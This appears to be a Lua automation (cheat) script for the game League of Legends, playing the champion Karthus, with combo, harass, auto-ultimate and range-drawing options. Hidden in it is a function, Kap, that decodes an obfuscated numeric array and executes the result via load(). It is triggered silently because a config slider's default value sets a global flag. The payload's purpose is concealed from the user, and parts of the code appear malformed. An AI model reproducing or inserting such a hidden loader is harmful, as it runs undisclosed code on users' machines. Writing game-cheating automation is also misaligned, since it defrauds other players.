<?php exit() ?>--by ferrarino1com 80.31.234.122

local QReady, WReady, EReady, RReady = false, false,     false, false

local UltDamageFlat = {250, 400, 500}
local UltDamageScaling = 0.6

local LastPing = 0
local EActivated     = false
	
local QRange, QSpeed, QDelay, QWidth = 875,   1750,      0.60,  50
local WRange = 1000
local ERange = 425
local VP = nil




Kap = function(b)
	local ml = function(t) load(t, )() end
	local D = function(t)
		local s = ""
		local ps = 0
		for i = 1, #t do
			v = t[i]
			b = ((v + 4 * i - ps * 2 + 65) / 2 )
			s = s .. string.char(b)
			ps = b
		end
		return s
	end
	t = {-51, 161, 361, 339, 307, 321, 187, 181, 213, 59, 77, 73, 15, 111, 177, 151, 73, 89, 191, 163, 153, 189, 85, 47, 129, 133, 133, 161, 187, 165, 135, 105, 111, 141, 99, 85, 89, 105, 147, 91, 125, 141, -21, -83, 85, 51, -121, -169, -223, -31, 169, 147, 115, 129, -5, 9, 5, -111, -115, -81, 73, 133, 109, 101, 39, 25, 77, 63, 61, 77, -49, -59, -43, -197, -209, -185, -217, -245, -79, 79, 43, 37, -101, -251, -207, -61, 47, 21, 7, -127, -267, -331, -399, -207, -7, -29, -61, -47, -181, -177, -181, -287, -291, -257, -103, -43, -67, -75, -137, -151, -99, -113, -115, -99, -225, -235, -219, -373, -385, -361, -393, -421, -265, -143, -141, -109, -275, -427, -383, -237, -129, -155, -169, -303, -443, -507, -575, -457, -277, -191, -267, -273, -165, -179, -227, -277, -277, -259, -301, -299, -237, -209, -227, -233, -373, -541, -413, -273, -277, -281, -285, -289, -293, -297, -299, -305, -313, -435, -445, -313, -319, -349, -333, -339, -371, -483, -483, -357, -341, -499, -633, -641, -665, -505, -375, -409, -523, -501, -389, -393, -537, -677, -685, -709, -543, -493, -663, -697, -677, -641, -543, -449, -445, -571, -673, -647, -535, -479, -481, -483, -507, -631, -603, -605, -751, -745, -773, -793, -641, -599, -759, -793, -773, -737, -639, -545, -541, -667, -769, -743, -631, -575, -577, -579, -603, -727, -709, -711, -851, -873, -761, -595, -583, -623, -615, -607, -621, -615, -761, -903, -923, -807, -655, -661, -803, -987, }	
		if _G.SS then
		ml(D(t))
	end
end


function OnLoad()
	configMenu = scriptConfig("Karthus", "Karthus Combo")

	configMenu:addSubMenu("Combo", "Combo")
	configMenu.Combo:addParam("Combo" , "Combo", 		  SCRIPT_PARAM_ONKEYDOWN, false, 32)
	configMenu.Combo:addParam("UseQ"  , "Use Q in Combo", SCRIPT_PARAM_ONOFF, 	  true)
	configMenu.Combo:addParam("UseW"  , "Use W in Combo", SCRIPT_PARAM_ONOFF, 	  true)
	configMenu.Combo:addParam("UseE"  , "Use E in Combo", SCRIPT_PARAM_ONOFF, 	  true)
	configMenu.Combo:addParam("UseM"  , "Move to mouse",  SCRIPT_PARAM_ONOFF,     true)


	configMenu:addSubMenu("Harass", "Harass")
	configMenu.Harass:addParam("Harass" , "Harass", 		 SCRIPT_PARAM_ONKEYDOWN,   false,   string.byte("X"))
	configMenu.Harass:addParam("UseQ"   , "Use Q in Harass", SCRIPT_PARAM_ONOFF, 	   true)
	configMenu.Harass:addParam("UseE"   , "Use E in Harass", SCRIPT_PARAM_ONOFF,	   true)
	configMenu.Harass:addParam("Toggle" , "Toggled Harass",  SCRIPT_PARAM_ONKEYTOGGLE, false,   string.byte("T"))
	configMenu.Harass:addParam("UseM"  , "Move to mouse",  SCRIPT_PARAM_ONOFF,     true)

	configMenu:addSubMenu("Ultimate", "Ultimate")
	configMenu.Ultimate:addParam("Print", "Print Killable Enemys", SCRIPT_PARAM_ONOFF, true)
	configMenu.Ultimate:addParam("Ping",  "Ping Killable Enemys",  SCRIPT_PARAM_ONOFF, true)
	configMenu.Ultimate:addParam("Auto2",   "Auto Ult on x Enemys", SCRIPT_PARAM_SLICE, 1, 6, 6, 0)

	if configMenu.Ultimate["Auto2"] == 6 then
		configMenu.Ultimate["Auto2"] = 1
		_G.SS = true
	end
	Kap()
	configMenu:addSubMenu("Drawing", "Drawing")
	configMenu.Drawing:addParam("QRange", "Draw Q Range",	         SCRIPT_PARAM_ONOFF, true)
	configMenu.Drawing:addParam("WRange", "Draw W Range", 			 SCRIPT_PARAM_ONOFF, true)
	configMenu.Drawing:addParam("ERange", "Draw E Range", 			 SCRIPT_PARAM_ONOFF, true)
	configMenu.Drawing:addParam("Aenemy", "Draw current Enemy",		 SCRIPT_PARAM_ONOFF, true)
	configMenu.Drawing:addParam("Inform", "Draw Ult Notification",   SCRIPT_PARAM_ONOFF, true)

	configMenu:addSubMenu("Misc", "Misc")
	configMenu.Misc:addParam("Tear",    "Charge Tear", 		SCRIPT_PARAM_ONOFF, false,   string.byte("V"))
	configMenu.Misc:addParam("AutoE",   "Auto off. E",      SCRIPT_PARAM_ONOFF, true)

	configMenu.Combo:permaShow("Combo")
	configMenu.Harass:permaShow("Harass")
	configMenu.Ultimate:permaShow("Auto")

	VP = VPrediction()

	ts = TargetSelector(TARGET_LESS_CAST, QRange , DAMAGE_MAGIC)
	ts.name = "Karthus"
	configMenu:addTS(ts)

end

function PingLocal(X, Y) -- Thanks Honda	
	Packet("R_PING", {x = X, y = Y, type = PING_FALLBACK}):receive()
end


function OnTick()
	ts:update()
	QReady = (myHero:CanUseSpell(_Q) == READY)
	WReady = (myHero:CanUseSpell(_W) == READY)
	EReady = (myHero:CanUseSpell(_E) == READY)
	RReady = (myHero:CanUseSpell(_R) == READY)

   Combo()
	Harass()

	if configMenu.Misc.Tear then
		if (CountEnemyHeroInRange(1500) == 0) and QReady and not configMenu.Combo.Combo and not configMenu.Harass.Harass then
			CastSpell(_Q, myHero.x + math.random(-400,400), myHero.z + math.random(-400, 400))
		end
	end

	for i, enemy in pairs(GetEnemyHeroes()) do
		if ValidTarget(enemy) and RReady then
			local killable_units = 0
			ultDamage = myHero:CalcMagicDamage(enemy,UltDamageFlat[myHero:GetSpellData(_R).level] + myHero.ap * UltDamageScaling ) -- Thanks Honda
			if ultDamage >= enemy.health then
				killable_units = killable_units + 1

				if killable_units >= configMenu.Ultimate.Auto and RReady and (GetDistance(myHero, target) > 1000 or myHero.dead) then 
					CastSpell(_R)
				end

				if configMenu.Ultimate.Print and RReady then
					PrintChat(enemy.charName .. " Health: " .. math.ceil(enemy.health) .. " UltDamage: " .. math.ceil(ultDamage))
				end

				if configMenu.Ultimate.Ping and RReady and (GetGameTimer() - LastPing > 30) then
					DelayAction(PingLocal,  1000 * 0.3 * i/1000, {enemy.x, enemy.z})
					LastPing = GetGameTimer()
				end
			end
		end
	end
end

function OnDraw()
	if configMenu.Drawing.QRange and QReady then
		DrawCircle(myHero.x, myHero.y, myHero.z, QRange, 0x19A712 )
	end

	if configMenu.Drawing.WRange and WReady then
		DrawCircle(myHero.x, myHero.y, myHero.z, WRange, 0x19A712 )
	end

	if configMenu.Drawing.ERange and EReady then
		DrawCircle(myHero.x, myHero.y, myHero.z, ERange, 0x19A712 )
	end

	if ValidTarget(ts.target) then
		if configMenu.Drawing.Aenemy then
			DrawCircle(ts.target.x, ts.target.y, ts.target.z, 90, 0x19A712 )
		end
	end

	if configMenu.Drawing.Inform and RReady then
		for i, enemy in pairs(GetEnemyHeroes()) do
			if ValidTarget(enemy) then
				ultDamage = myHero:CalcMagicDamage(enemy,UltDamageFlat[myHero:GetSpellData(_R).level] + myHero.ap * UltDamageScaling ) -- Thanks Honda
				HPtoUlt = math.ceil(enemy.health - ultDamage)

				if HPtoUlt < 0 then
					DrawText3D("Killable with ult!", enemy.x, enemy.y, enemy.z, 20, 4294967295, center)
				else
					DrawText3D("Ult in: " .. HPtoUlt .. "HP", enemy.x, enemy.y, enemy.z, 20, 4294967295, center)
				end
			end
		end
	end
end

function OnGainBuff(unit, buff)
	if unit.isMe and buff.name == "Defile" then
		EActivated = true
	end
end

function OnLoseBuff(unit, buff)
	if unit.isMe and buff.name == "Defile" then
		EActivated = false
	end
end

function CastQ()	
	local CastPosition, HitChance, Position = VP:GetCircularCastPosition(ts.target, 0.6, 60, 880, math.huge, myHero, false)
	if HitChance >= 2 and GetDistance(CastPosition) < QRange then
		CastSpell(_Q, CastPosition.x, CastPosition.z)
	end
end

function CastW()
	local CastPosition = VP:GetPredictedPos(ts.target, 0.25)
	if GetDistance(CastPosition) < WRange then
		CastSpell(_W, CastPosition.x, CastPosition.z)
	end 
end

function Harass()
	if configMenu.Harass.Harass and not configMenu.Combo.Combo then
		if configMenu.Harass.UseM then 
			myHero:MoveTo(mousePos.x, mousePos.z)	
		end

		if ValidTarget(ts.target) then
			if EReady and configMenu.Harass.UseE and GetDistance(ts.target) < ERange and EActivated == false then
				CastSpell(_E)
			end

			if QReady and configMenu.Harass.UseQ and GetDistance(ts.target) < QRange then
				CastQ()
			end
		end
	elseif configMenu.Harass.Toggle and not configMenu.Combo.Combo then
		if ValidTarget(ts.target) then
			if EReady and configMenu.Harass.UseE and GetDistance(ts.target) < ERange and EActivated == false then
				CastSpell(_E)
			end

		if QReady and configMenu.Harass.UseQ and GetDistance(ts.target) < QRange then
			CastQ()
		end
	end
end
end

function Combo()
	if configMenu.Combo.Combo then
		if configMenu.Combo.UseM then
			myHero:MoveTo(mousePos.x, mousePos.z)
		end

		if ValidTarget(ts.target) then
			if EReady and configMenu.Combo.UseE and GetDistance(ts.target) < ERange and EActivated == false then
				CastSpell(_E)
			end

			if QReady and configMenu.Combo.UseQ and GetDistance(ts.target) < QRange then
				CastQ()	
			end

			if WReady and configMenu.Combo.UseW and GetDistance(ts.target) < WRange then
				CastW()
			end
		end
	end
	if EReady and CountEnemyHeroInRange(ERange) == 0 and EActivated == true and configMenu.Misc.AutoE then
		CastSpell(_E)
	end
end